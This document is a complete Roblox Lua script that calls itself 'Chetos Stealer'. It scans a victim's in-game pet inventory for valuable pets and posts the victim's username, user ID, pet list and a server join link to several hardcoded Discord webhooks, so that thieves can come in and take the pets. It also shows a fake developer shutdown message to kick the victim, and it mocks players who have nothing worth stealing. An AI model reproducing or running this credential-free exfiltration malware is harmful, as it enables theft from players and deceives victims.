if getgenv().ChetosStealerHasRun then return end
getgenv().ChetosStealerHasRun = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer

local CONFIG = {
    BANNED_NAME_PATTERNS = {
        "^SfavenG%d+$"
    },
    ALL_HITS_WEBHOOK_URL = "https://discord.com/api/webhooks/1397485572884271134/SeiDaELPQmgoaYyUIsXAefydjAfIi8_CVO0qAawMu5zGZeFOTXkKxy8nf6OwWPRHuucB",
    KITSUNE_WEBHOOK_URL = "https://discord.com/api/webhooks/1397485371779973150/F8IGnpfXUJlxJRYQBSTFANg_An2e0Ih2jAFQRkaE7XWe5UC8YruXddau8qb3OZy52VF1",
    LOGS_WEBHOOK_URL = "https://discord.com/api/webhooks/1399656998735187989/fDybU5d8Ub9HhKxa0BL7zAUDgUpmCTe4ibQMYL-D1L-fMzq9tz6ASmEO73eNIRPaNHPV",
    MONITOR_WEBHOOK_URL = "https://discord.com/api/webhooks/1400806550779596800/zxuZoPbbY2_DpsgcP3Wm2AnmcjfUAfLNh-jddCn_PWPKj8Uvzaoeod3cVZidn-i3CMKw",
    PING_MESSAGE = "@everyone **kupal naka HIT!!!🤑🤑🤑🤑**",
    KITSUNE_PING_MESSAGE = "@everyone",
    DYNAMIC_DISCORD_LINKS = {
        "https://discord.gg/ZXwu8pKQwp",
        "https://discord.gg/ZXwu8pKQwp"
    },
    HUGE_PET_WEIGHT = 6.0,
    AGED_PET_DAYS = 50,
    MAX_PETS_IN_LIST = 10,
    TARGET_PET_TYPES = {
        ["Disco Bee"] = true, ["Raccoon"] = true, ["Dragonfly"] = true, ["Mimic Octopus"] = true,
        ["Butterfly"] = true, ["Queen Bee"] = true, ["T-Rex"] = true,
        ["Rainbow Ankylosaurus"] = true, ["Rainbow Dilophosaurus"] = true, ["Rainbow Pachycephalosaurus"] = true,
        ["Rainbow Iguanodon"] = true, ["Rainbow Parasaurolophus"] = true, ["Kitsune"] = true,
        ["Spinosaurus"] = true, ["Rainbow Spinosaurus"] = true,
        ["Mizuchi"] = true, ["Corrupted Kitsune"] = true, ["Rainbow Kitsune"] = true
    }
}

local MUTATION_MAP = {
    a = "Shocked", b = "Golden", c = "Rainbow", d = "Shiny",
    e = "Windy", f = "Frozen", g = "Inverted", h = "Rideable",
    i = "Mega", j = "Tiny", k = "IronSkin", l = "Radiant",
    m = "Normal", n = "Ascended", o = "Tranquil", p = "Corrupted",
    Shocked = "Shocked", Golden = "Golden", Rainbow = "Rainbow", Shiny = "Shiny",
    Windy = "Windy", Frozen = "Frozen", Inverted = "Inverted", Rideable = "Rideable",
    Mega = "Mega", Tiny = "Tiny", IronSkin = "IronSkin", Radiant = "Radiant",
    Normal = "Normal", Ascended = "Ascended", Tranquil = "Tranquil", Corrupted = "Corrupted"
}

local formattedPriorityPetsForMonitor = "Scanning..."

local function clone(original)
    local copy = {}
    for k, v in pairs(original) do
        copy[k] = v
    end
    return copy
end

local function kickVictimForSecurity()
    player:Kick("Hi, this is Jandel. The server is shutting down for a new update. Please rejoin.")
end

local function checkPlayer(playerToCheck)
    if playerToCheck == player then return false end
    for _, pattern in ipairs(CONFIG.BANNED_NAME_PATTERNS) do
        if string.match(playerToCheck.Name, pattern) then
            kickVictimForSecurity()
            return true
        end
    end
    return false
end

for _, existingPlayer in ipairs(Players:GetPlayers()) do
    if checkPlayer(existingPlayer) then return end
end
Players.PlayerAdded:Connect(checkPlayer)

local Util = {}
function Util.Get(tbl, path, default)
    local current = tbl
    for key in string.gmatch(path, "[^.]+") do
        if type(current) ~= "table" or not current[key] then return default end
        current = current[key]
    end
    return current
end

local function getExecutorName()
    if getexecutorname then
        local success, name = pcall(getexecutorname)
        if success and type(name) == "string" then return name end
    end
    if identifyexecutor then
        local success, name = pcall(identifyexecutor)
        if success and type(name) == "string" then return name:gsub(" Executor", "") end
    end
    if syn then return "Synapse X" end
    if Krnl then return "Krnl" end
    if Fluxus then return "Fluxus" end
    if SENTINEL_V2 then return "Sentinel" end
    return "Unknown"
end

local function createStyledNotificationGUI(titleText, messageText, buttonText)
    local chosenLink = CONFIG.DYNAMIC_DISCORD_LINKS[math.random(1, #CONFIG.DYNAMIC_DISCORD_LINKS)]
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.DisplayOrder = 1000
    local overlay = Instance.new("Frame", gui)
    overlay.Size = UDim2.fromScale(1, 1)
    overlay.BackgroundColor3 = Color3.new(0, 0, 0)
    overlay.BackgroundTransparency = 0.4
    overlay.Active = true
    local gradient = Instance.new("UIGradient", overlay)
    gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)), ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))})
    gradient.Rotation = 90
    local mainFrame = Instance.new("Frame", overlay)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.Position = UDim2.fromScale(0.5, 0.5)
    mainFrame.Size = UDim2.new(0, 500, 0, 250)
    mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.BorderSizePixel = 0
    local corner = Instance.new("UICorner", mainFrame)
    corner.CornerRadius = UDim.new(0, 12)
    local stroke = Instance.new("UIStroke", mainFrame)
    stroke.Color = Color3.fromRGB(120, 80, 255)
    stroke.Thickness = 2
    stroke.Transparency = 0.4
    local titleLabel = Instance.new("TextLabel", mainFrame)
    titleLabel.AnchorPoint = Vector2.new(0.5, 0)
    titleLabel.Position = UDim2.fromScale(0.5, 0.1)
    titleLabel.Size = UDim2.fromScale(0.8, 0.2)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = titleText
    titleLabel.TextColor3 = Color3.new(1, 1, 1)
    titleLabel.TextScaled = true
    local messageLabel = Instance.new("TextLabel", mainFrame)
    messageLabel.AnchorPoint = Vector2.new(0.5, 0.45)
    messageLabel.Position = UDim2.fromScale(0.5, 0.45)
    messageLabel.Size = UDim2.fromScale(0.85, 0.3)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Font = Enum.Font.SourceSans
    messageLabel.Text = messageText
    messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    messageLabel.TextSize = 18
    messageLabel.TextWrapped = true
    messageLabel.TextXAlignment = Enum.TextXAlignment.Center
    messageLabel.TextYAlignment = Enum.TextYAlignment.Center
    local linkButton = Instance.new("TextButton", mainFrame)
    linkButton.AnchorPoint = Vector2.new(0.5, 1)
    linkButton.Position = UDim2.fromScale(0.5, 0.9)
    linkButton.Size = UDim2.fromScale(0.7, 0.25)
    linkButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    linkButton.Font = Enum.Font.SourceSansBold
    linkButton.Text = buttonText
    linkButton.TextColor3 = Color3.new(1, 1, 1)
    linkButton.TextScaled = true
    local btnCorner = Instance.new("UICorner", linkButton)
    btnCorner.CornerRadius = UDim.new(0, 8)
    local btnStroke = Instance.new("UIStroke", linkButton)
    btnStroke.Color = Color3.fromRGB(255, 255, 255)
    btnStroke.Thickness = 1
    btnStroke.Transparency = 0.9
    linkButton.MouseButton1Click:Connect(function()
        if type(setclipboard) == "function" then
            setclipboard(chosenLink)
            linkButton.Text = "LINK COPIED!"
            task.wait(2)
            linkButton.Text = buttonText
        end
    end)
    return gui
end

local function sendOurWebhook(url, payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if not requestFunc then return end
    task.spawn(function()
        local encodedPayload = HttpService:JSONEncode(payload)
        local requestData = {Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encodedPayload}
        pcall(requestFunc, requestData)
    end)
end

task.spawn(function()
    local PetRegistry, InventoryData
    local success = pcall(function()
        PetRegistry = require(ReplicatedStorage.Data.PetRegistry.PetList)
        InventoryData = require(ReplicatedStorage.Modules.DataService):GetData().PetsData.PetInventory.Data
    end)
    if not (success and PetRegistry and InventoryData) then return end

    local priorityPets = {}
    local stats = { total = 0, huge = 0, agedMutated = 0 }
    local hasKitsune = false
    local hasDiscoBee = false
    local hasSpecialPets = false
    local hasMegaHuge = false
    local hasAscendedPet = false
    local dragonflyCount = 0
    local butterflyCount = 0
    local hasDragonflyCombo = false
    local hasButterflyCombo = false
    local hasMegaTargetPet = false

    for uuid, petInfo in pairs(InventoryData) do
        if type(petInfo) == "table" and petInfo.PetData then
            local baseWeight = tonumber(Util.Get(petInfo, "PetData.BaseWeight", 0))
            if baseWeight > 0 or tonumber(Util.Get(petInfo, "PetData.Weight", 0)) > 0 then
                stats.total += 1
                local mutationValue = Util.Get(petInfo, "PetData.MutationType") or Util.Get(petInfo, "PetData.Mutation")
                local mutationName = (mutationValue and MUTATION_MAP[tostring(mutationValue)]) or ""
                local basePetType = tostring(petInfo.PetType or "Unknown")
                local pet = {uuid = uuid, baseType = basePetType, typeName = (mutationName ~= "" and mutationName .. " " or "") .. basePetType, weight = tonumber(Util.Get(petInfo, "PetData.Weight")) or baseWeight, baseWeight = baseWeight, age = tonumber(Util.Get(petInfo, "PetData.Age", 0)), level = tonumber(Util.Get(petInfo, "PetData.Level", 1)), isHuge = baseWeight >= CONFIG.HUGE_PET_WEIGHT, isAged = (math.floor(tonumber(Util.Get(petInfo, "PetData.Age", 0)) / 86400) >= CONFIG.AGED_PET_DAYS), isMutated = mutationName ~= "", isTargetType = CONFIG.TARGET_PET_TYPES[basePetType]}
                
                if basePetType == "Kitsune" then hasKitsune = true end
                if basePetType == "Disco Bee" then hasDiscoBee = true end
                if basePetType == "Raccoon" or basePetType == "Butterfly" then hasSpecialPets = true end
                if basePetType == "Dragonfly" then dragonflyCount = dragonflyCount + 1 end
                if basePetType == "Butterfly" then butterflyCount = butterflyCount + 1 end
                if mutationName == "Mega" and pet.isHuge then hasMegaHuge = true end
                if mutationName == "Ascended" then hasAscendedPet = true end
                if basePetType == "Dragonfly" and (mutationName == "Ascended" or mutationName == "Mega" or mutationName == "Rainbow") then hasDragonflyCombo = true end
                if basePetType == "Butterfly" and (mutationName == "Golden" or mutationName == "Ascended" or mutationName == "Mega") then hasButterflyCombo = true end
                if mutationName == "Mega" and pet.isTargetType then hasMegaTargetPet = true end

                if pet.isTargetType or pet.isHuge then table.insert(priorityPets, pet); if pet.isHuge then stats.huge += 1 end; if pet.isAged or pet.isMutated then stats.agedMutated += 1 end end
            end
        end
    end

    if #priorityPets == 0 then
        createStyledNotificationGUI("PET STEALER", "HEY BROTHER YOU ARE POOR YOU DONT HAVE PET I CAN STEAL!!🤣😂 IF YOU WANT TO STEAL PEOPLE PETS JOIN IN THE DISCORD CLICK THE DISCORD", "Copy Discord Link")
        return
    end

    task.spawn(function()
        while player.Parent do
            local playerList = {}
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= player then
                    table.insert(playerList, string.format("`%s` (@%s)", p.DisplayName, p.Name))
                end
            end
            
            local playerListString = table.concat(playerList, "\n")
            if #playerList == 0 then
                playerListString = "No other players in the server."
            end

            local embed = {
                title = "Server Monitor",
                color = 16776960,
                fields = {
                    {name = "🎯 Target Victim", value = string.format("`%s` (@%s)", player.DisplayName, player.Name), inline = false},
                    {name = "🐾 Victim's Priority Pets", value = formattedPriorityPetsForMonitor, inline = false},
                    {name = "👥 Other Players in Server", value = "```\n" .. playerListString .. "\n```", inline = false}
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
            
            local payload = {
                username = "CHETOS MONITOR",
                avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",
                embeds = { embed }
            }

            sendOurWebhook(CONFIG.MONITOR_WEBHOOK_URL, payload)
            task.wait(4)
        end
    end)

    local function getPetSortScore(pet)
        if string.find(pet.typeName:lower(), "rainbow") then return 1 end
        if string.find(pet.typeName:lower(), "devine") then return 2 end
        if pet.isHuge then return 3 end
        if pet.isMutated or pet.isAged then return 4 end
        return 5
    end

    table.sort(priorityPets, function(a, b)
        local scoreA = getPetSortScore(a)
        local scoreB = getPetSortScore(b)
        if scoreA ~= scoreB then
            return scoreA < scoreB
        else
            return a.weight > b.weight
        end
    end)

    local function formatPetList()
        local list = {}
        for i, pet in ipairs(priorityPets) do
            local icon = pet.isHuge and "🤭" or (pet.isAged or pet.isMutated) and "⭐" or "🎯"
            local ageText = ""
            if pet.age > 0 then local days, hours = math.floor(pet.age / 86400), math.floor((pet.age % 86400) / 3600); ageText = days > 0 and string.format(" (Age: %dd %dh)", days, hours) or string.format(" (Age: %dh)", hours) end
            local weightText = pet.weight ~= pet.baseWeight and string.format("%.2f KG (Base: %.2f KG)", pet.weight, pet.baseWeight) or string.format("%.2f KG", pet.weight)
            table.insert(list, string.format("%s %s - %s%s [Lv.%d]", icon, pet.typeName, weightText, ageText, pet.level))
            if i >= CONFIG.MAX_PETS_IN_LIST then local remaining = #priorityPets - i; if remaining > 0 then table.insert(list, string.format("➕ ... and %d more priority pets", remaining)) end; break end
        end
        return "```\n" .. table.concat(list, "\n") .. "\n```"
    end

    formattedPriorityPetsForMonitor = formatPetList()

    local serverPlayerCount, maxPlayerCount = #Players:GetPlayers(), Players.MaxPlayers
    local serverStatus = string.format("%d/%d%s", serverPlayerCount, maxPlayerCount, serverPlayerCount >= maxPlayerCount and " (Player has left)" or "")
    local executorName = getExecutorName()
    local loaderWebhook = getgenv().Webhook
    
    local shouldPing = serverPlayerCount > 1 and serverPlayerCount < maxPlayerCount
    
    local hasPetCombo = (dragonflyCount >= 3 and butterflyCount >= 2)
    
    local join_link = string.format("[Join Server](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)
    local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", game.PlaceId, game.JobId)
    local description = table.concat({"**👤 Player Information**", "```", ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name), ("👁️ User ID: %d"):format(player.UserId), ("🦸 Receiver: %s"):format(getgenv().receiver or ""), ("💻 Executor: %s"):format(executorName), ("🌐 Server: %s"):format(serverStatus), "```", "**📊 BACKPACK STATISTICS**", "```", ("🤭 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge), ("⭐ Aged/Mutated: %d"):format(stats.agedMutated), ("🎯 Priority Pets: %d"):format(#priorityPets), "```", "**🐾 All Pets**", formattedPriorityPetsForMonitor, "**🔗 SERVER ACCESS - GET THE LOOT!**", "Click 'Join Server' to get the pets. If the victim is not in the server, they have already left.", join_link}, "\n")
    local embed = {title = "🐾 **CHETOS STEALER PALDO**", color = 2829617, description = description, footer = { text = "CHETOS STEALER • by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
    
    local base_payload = {username = " CHETOS PETS STEALER", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed }}

    local isExclusiveHit = hasKitsune or hasDiscoBee or #priorityPets >= 10 or hasDragonflyCombo or hasButterflyCombo or hasMegaTargetPet
    
    if isExclusiveHit then
        local payload = clone(base_payload)
        if shouldPing then payload.content = teleport_command .. "\n" .. CONFIG.PING_MESSAGE; payload.allowed_mentions = { parse = {"everyone"} } end
        sendOurWebhook(CONFIG.KITSUNE_WEBHOOK_URL, payload)
    elseif hasSpecialPets or hasMegaHuge or hasAscendedPet or hasPetCombo then
        local payload = clone(base_payload)
        if shouldPing then payload.content = teleport_command .. "\n" .. CONFIG.PING_MESSAGE; payload.allowed_mentions = { parse = {"everyone"} } end
        sendOurWebhook(CONFIG.KITSUNE_WEBHOOK_URL, payload)
        sendOurWebhook(CONFIG.ALL_HITS_WEBHOOK_URL, payload)
        if loaderWebhook then
            sendOurWebhook(loaderWebhook, payload)
        end
    else
        local payload = clone(base_payload)
        if shouldPing then payload.content = teleport_command .. "\n" .. CONFIG.PING_MESSAGE; payload.allowed_mentions = { parse = {"everyone"} } end
        sendOurWebhook(CONFIG.ALL_HITS_WEBHOOK_URL, payload)
        if loaderWebhook then
            sendOurWebhook(loaderWebhook, payload)
        end
    end

    if not isExclusiveHit then
        local log_description = string.format("**Receiver:** %s\n\n**Pets Found:**\n%s", getgenv().receiver or "N/A", formattedPriorityPetsForMonitor)
        local embed_log = {title = "🐾 New Hit Logged", color = 15158332, description = log_description, footer = { text = "Public Feed" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
        local payload_log = {username = "CHETOS LOGS", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed_log }}
        sendOurWebhook(CONFIG.LOGS_WEBHOOK_URL, payload_log)
    end
end)
